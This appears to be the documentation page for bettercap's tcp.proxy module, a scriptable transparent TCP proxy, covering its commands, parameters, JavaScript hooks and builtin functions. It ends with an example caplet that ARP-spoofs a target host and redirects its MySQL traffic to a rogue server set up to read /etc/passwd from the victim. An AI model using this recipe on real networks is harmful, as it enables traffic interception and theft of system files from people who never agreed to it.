---
title: "tcp.proxy"
date: 2019-02-25T13:18:06+01:00
draft: false
weight: 3
---

A TCP transparent proxy that can be scripted using javascript modules. If used together with a [spoofer](/modules/ethernet/spoofers/), all TCP traffic to a given address and port will be redirected to it and it will automatically handle port redirections as needed.

The optional `tcp.tunnel` parameter can be used to redirect the traffic from `tcp.address` to `tcp.tunnel.address`.

### Commands

#### `tcp.proxy on`

Start the TCP proxy.

#### `tcp.proxy off`

Stop the TCP proxy.

### Parameters

| parameter | default | description |
|-----------|---------|-------------|
| `tcp.port` | `443` | TCP port to redirect when the proxy is activated. |
| `tcp.address` |  | **Mandatory** remote address of the TCP proxy. |
| `tcp.proxy.port` | `8443` | Port to bind the TCP proxy to. |
| `tcp.proxy.address` | `<interface address>` | Address to bind the TCP proxy to. |
| `tcp.proxy.script` | | Path of a proxy module script. |
| `tcp.tunnel.address` | | Address to redirect the TCP tunnel to (optional). |
| `tcp.tunnel.port` | | Port to redirect the TCP tunnel to (optional) |

### Modules

The `tcp.proxy` module can be scripted using javascript files that must declare at least one of the following functions:

```js
// called when the script is loaded
function onLoad() {

}

// called when data is available
// return an array of bytes to override "data"
function onData(from, to, data) {

}
```

Modules can change the `data` buffer and return it, signaling the proxy to override the original buffer.

### Builtin Functions

Modules can use the following builtin functions.

| function | description |
|----------|-------------|
| `readDir("/path/")` | Return the contents of a directory as a string array. |
| `readFile("/path/to/file")` | Return the contents of a file as a string. |
| `writeFile("/path/to/file", "hello world")` | Write the string `hello world` to a file, returns `null` or an error message. |
| `log_debug("message")` | Log a message in the interactive session (its level will be `DEBUG`). |
| `log_info("message")` | Log a message in the interactive session (its level will be `INFO`). |
| `log_warn("message")` | Log a message in the interactive session (its level will be `WARNING`). |
| `log_error("message")` | Log a message in the interactive session (its level will be `ERROR`). |
| `log_fatal("message")` | Log a message in the interactive session (its level will be `FATAL`). |
| `log("message")` | Shortcut for `log_info("message")`. |
| `btoa("message")` | Encode a message to base64. |
| `atob("bWVzc2FnZQ==")` | Decode a message from base64. |
| `gzipCompress("plaintext data")` | Compress a string using gzip encoding. |
| `gzipDecompress(")9�\+�I��+I�(QHI,I����")` | Decompress a gzip encoded string. |
| `env("iface.ipv4")` | Read a variable. |
| `env("foo", "bar")` | Set a variable. |

### Examples

The [rogue-mysql-server.cap](https://github.com/bettercap/caplets/blob/master/rogue-mysql-server.cap) executes an ARP spoofing attack against a single host and redirect the MySQL traffic to a [builtin rogue server](/modules/ethernet/servers/mysql.server/):

```sh
# set the target for arp spoofing
set arp.spoof.targets 192.168.1.236

# bind rogue mysql server to localhost and
# set the file we want to read
set mysql.server.address 127.0.0.1
set mysql.server.port 3306
set mysql.server.infile /etc/passwd
mysql.server on

# set the ip from the mysql server we want to impersonate
set tcp.address 93.184.216.34
set tcp.port 3306

# set the ip from the rogue mysql server
set tcp.tunnel.address 127.0.0.1
set tcp.tunnel.port 3306

# go ^_^
tcp.proxy on
arp.spoof on
```
